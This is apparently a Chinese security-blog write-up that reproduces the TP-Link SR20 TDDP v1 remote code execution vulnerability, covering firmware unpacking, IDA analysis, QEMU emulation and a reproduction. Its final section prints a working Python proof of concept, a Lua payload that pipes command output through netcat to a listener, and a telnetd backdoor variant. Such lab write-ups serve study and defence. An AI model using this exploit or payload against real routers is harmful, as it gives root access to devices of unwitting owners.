# TP-LINK Smart Home Router远程代码执行漏洞复现及漏洞分析
> kris
> 来源：https://www.iotsec-zone.com/article/490

漏洞复现设备：TP-LINK （Smart Home Router）SR20
漏洞原理：路由器中存在远程代码执行
漏洞产生原因：TP-LINK公司专有协议：TDDP协议，该协议v1版本存在一个远程代码执行漏洞，攻击者可以利用该漏洞在路由器上以root权限执行任意命令
复现环境：qemu-system IDA Netcat

## 漏洞分析
TDDP v1不存在验证功能，所以在向SR20的UDP1040端口发送数据时，路由器都会接受并处理，如果发送数据的第二字节是0x31，设备就会连接发送该请求的设备，用TFTP服务下载相应的文件，然后使用lua加载并执行一个外部lua文件

首先对下载好的固件包进行binwalk -Me进行解包，解包后squashfs-root目录就是固件文件系统

![0.png](https://www.iotsec-zone.com/api/image/v2/20250122/d789itskz45clkmrfv.png)

使用find命令查找“tppd”
find ./ -name “tddp”

![1.png](https://www.iotsec-zone.com/api/image/v2/20250122/d789jzwdoeglzowsqj.png)

使用read -h命令分析和显示ELF文件信息

![2.png](https://www.iotsec-zone.com/api/image/v2/20250122/d789kebwz325whd8im.png)
得知此二进制文件是arm32位、小端

接下来把tddp二进制文件拖进IDA里进行分析
使用shift+F12查找“tppd“，快速定位程序入口

![3.png](https://www.iotsec-zone.com/api/image/v2/20250122/d789m72iu16lsbae3h.png)
![4.png](https://www.iotsec-zone.com/api/image/v2/20250122/d789me6ljsa8j6dfjt.png)

按F5进行分析，发现其中v6似乎是一个指向某个结构体或数组的指针，代表了某种网络连接或任务上下文

![5.png](https://www.iotsec-zone.com/api/image/v2/20250122/d789n9puuh2tld3fd7.png)

往下看发现设置了timeout和readfds，执行sellect，如果select返回数据，且该数据可读取，则调用sub_16418进行处理

![6.png](https://www.iotsec-zone.com/api/image/v2/20250122/d789nstu80e5atodu3.png)

点进sub_16418继续分析，这里对v2进行了判断，如果v2=1，那么就调用sub_9340函数并将返回值存储在a1[13]中，再传递a1和&n到sub_15E74函数

![7.png](https://www.iotsec-zone.com/api/image/v2/20250122/d789olnzz99lyrrwrw.png)

再进入到sub_15E74函数里，前文提到了在发送数据第二字节为0x31时，设备就会连接发送请求设备，下载相应文件

![8.png](https://www.iotsec-zone.com/api/image/v2/20250122/d789pht96xq53bby1j.png)

进入到sub_A580函数，如果读取失败或者字符串为空，程序回输出错误信息并跳转到LABEL_20，v16被赋值为从a1+4出获取IP地址，调用sub_91DC执行命令cd /tmp；tftp -gr %s %s &，这会在后台执行一个TFTP下载操作，并把此脚本或配置文件放到/tmp目录下，程序等待文件下载完成并执行，使用sleep每秒检查一次文件是否已经下载完成并检查文件是否存在

![9.png](https://www.iotsec-zone.com/api/image/v2/20250122/d789pu7fqcj0aerrzs.png)

## 固件模拟
上文已经得知tddp文件是arm32位
下面直接使用arm环境进行模拟
首先需要给本机配置一个tap0网卡,使虚拟机能和模拟系统进行通信
```
sudo tunctl -t tap0
sudo ifconfig tap0 192.168.0.4/24 up
```

因为漏洞使用TFTP下载文件，所以在虚拟机也需要安装TFTP服务
sudo apt install atftpd

![10.png](https://www.iotsec-zone.com/api/image/v2/20250122/d789rpsqin8b35fahp.png)

下载成功后需修改/etc/default/atftpd文件
首先对文件进行chmod 777，其次把文件内容修改为以下内容

```
## Options for atftpd:
USE_INETD=false
OPTIONS="--tftpd-timeout 300 --retry-timeout 5 --mcast-port 1758 --mcast-addr 239.239.239.0-255 --mcast-ttl 1 --maxthread 100 --verbose=5 /tftpboot"
```
PS：将 USE_INETD设置为 false让 atftpd作为独立进程运行，而不是通过inetd启动

修改完成后回到 / 目录下创建tftpboot文件夹，并给tftpboot文件夹chmod 777权限

![11.png](https://www.iotsec-zone.com/api/image/v2/20250122/d789tzxqda910c1blu.png)

使用sudo systemctl start atftpd 启动atftpd服务
使用sudo systemctl status atftpd 查看服务是否为开启状态

![12.png](https://www.iotsec-zone.com/api/image/v2/20250122/d789usayykdvk5jtja.png)

配置完成后使用qemu-system-arm程序模拟整个系统
```
#!/bin/sh
qemu-system-arm \
    -M vexpress-a9 \
    -kernel /home/iot/Desktop/tools/qemu-images/armhf/vmlinuz-3.2.0-4-vexpress \
    -initrd /home/iot/Desktop/tools/qemu-images/armhf/initrd.img-3.2.0-4-vexpress \
    -drive if=sd,file=/home/iot/Desktop/tools/qemu-images/armhf/debian_wheezy_armhf_standard.qcow2 \
    -append "root=/dev/mmcblk0p2 console=ttyAMA0" \
    -net nic -net tap,ifname=tap0,script=no,downscript=no \
    -nographic
```

启动完成后用root/root登陆进入到主页面,再对eth0网卡配置
```
ifconfig eth0 192.168.0.3/24
```
![13.png](https://www.iotsec-zone.com/api/image/v2/20250122/d789w967zu9jjjbod0.png)
使用以上命令将eth0网卡配置成功，并与虚拟机能正常通信

在虚拟机上用scp将文件传到模拟系统中
```
scp -r ~/Desktop/SR20/_tpra_sr20v1.bin.extracted/squashfs-root root@192.168.0.3:/root/
```
![14.png](https://www.iotsec-zone.com/api/image/v2/20250122/d789xcuy63xzpspune.png)

chroot默认不会切换/dev和/proc，因此切换根目录前需要挂载这两个目录
```
mount -o bind /dev ./squashfs-root/dev/
mount -t proc /proc/ ./squashfs-root/proc/
```

因为后面会用到Netcat实现反向shell或数据泄漏
所以用which命令找到netcat工具是否存在
which netcat
![15.png](https://www.iotsec-zone.com/api/image/v2/20250122/d789yiyc4f8kwdxaxk.png)

至此环境搭建完成

## 漏洞复现
在之前创建的tftpboot文件夹下创建名为payload的文件并写入一个简单的lua脚本，通常用于远程命令执行漏洞，这串代码利用os.execute执行外部命令，并通过netcat将信息发送到指定的ip和端口

```bash
function config_test(config) #用于执行系统命令
os.execute("id|nc 192.168.0.4 1234") #Lua函数，能够在操作系统中执行传入命令，运行系统命令
end
```

在模拟系统界面进入squashfs-root目录下输入
```
chroot . sh
tddp
```
![16.png](https://www.iotsec-zone.com/api/image/v2/20250122/d789zpkox134bilftk.png)
启动tddp

使用nmap进行扫描，确认tddp成功启动
```
sudo nmap -p 1040 -sU 192.168.0.3
```
![17.png](https://www.iotsec-zone.com/api/image/v2/20250122/d78a0hkmaexd5aiznw.png)

在虚拟机终端用nc启动监听
```
nc -lvnp 1234
```
启动监听后在/etc/tftpboot目录下执行poc
```
python3 poc.py 192.168.0.3 "payload"
```
```bash
#!/usr/bin/python3
# Copyright 2019 Google LLC.
# SPDX-License-Identifier: Apache-2.0
# Create a file in your tftp directory with the following contents:
#function config_test(config)
# os.execute("telnetd -l /bin/login.sh")
#end
# Execute script as poc.py remoteaddr filename
import sys

import binascii

import socket

 

port_send = 1040

port_receive = 61000

 

tddp_ver = "01"

tddp_command = "31"

tddp_req = "01"

tddp_reply = "00"

tddp_padding = "%0.16X" % 00

 

tddp_packet = "".join([tddp_ver, tddp_command, tddp_req, tddp_reply, tddp_padding])

 

sock_receive = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

sock_receive.bind(('', port_receive))

 

# Send a request

sock_send = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

packet = binascii.unhexlify(tddp_packet)

argument = "%s;arbitrary" % sys.argv[2]

packet = packet + argument.encode()

sock_send.sendto(packet, (sys.argv[1], port_send))

sock_send.close()

 

response, addr = sock_receive.recvfrom(1024)

r = response.encode('hex')

print(r)
```

![18.png](https://www.iotsec-zone.com/api/image/v2/20250122/d78a1yzmlldoxhbayv.png)
至此漏洞复现成功

## 总结
TP-Link SR20 路由器通过tftp远程下载文件、执行脚本或获取系统敏感信息，攻击者可以通过该漏洞在目标路由器上执行任意命令，包括但不限于下载恶意文件、访问路由器配置文件、破坏网络配置等。如果想解决该问题可以通过对管理限制访问、禁用远程管理、强密码和双因素的认证等。
